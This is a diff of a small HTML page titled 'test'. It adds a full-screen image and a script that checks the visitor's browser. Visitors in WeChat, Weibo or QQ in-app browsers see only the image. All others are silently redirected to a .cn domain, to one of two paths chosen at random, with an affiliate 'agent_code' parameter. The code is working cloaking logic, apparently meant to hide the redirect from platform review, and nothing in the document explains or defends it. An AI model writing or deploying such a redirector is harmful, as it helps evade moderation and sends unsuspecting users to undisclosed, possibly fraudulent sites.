@@ -4,18 +4,51 @@
 <head>
     <meta charset="utf-8">
     <title>test</title>
+    <style type="text/css">
+        body {
+            margin: 0;
+            padding: 0;
+            width: 100vw;
+            height: 100vh;
+            overflow: hidden;
+            background-color: rgba(0, 0, 0, .8);
+        }
+
+        .container {
+            width: 100vw;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        .container img {
+            width: 100%;
+            margin-top: -18%;
+        }
+    </style>
 </head>
 
 <body>
     test
+    <div class="container">
+        <img src="https://gfdg.swsqhj.com/www/1.png" alt="">
+    </div>
+
     <script>
-        if (window.location.search) {
-            let params = new URLSearchParams(window.location.search);
-            let [agent_code, tp] = [params.get('agent_code'), params.get('tp') || 1];
-            let tzurl = "https://brbsyf55.cn/html" + tp + "?agent_code=" + agent_code;
-            window.location.replace(tzurl)
+        let ua = navigator.userAgent;
+        if (/micromessenger/i.test(ua) || ua.indexOf("weibo") > -1 || ua.indexOf(" qq") > -1) {
+
+        } else {
+            if (window.location.search) {
+                let all = [1, 5]
+                let params = new URLSearchParams(window.location.search);
+                let [agent_code, tp] = [params.get('agent_code'), params.get('tp') || all[Math.floor(Math.random() * all.length)]];
+                let tzurl = "https://brbsyf55.cn/html" + tp + "?agent_code=" + agent_code;
+                window.location.replace(tzurl)
+            }
         }
+
     </script>
+
 </body>
 
 </html>
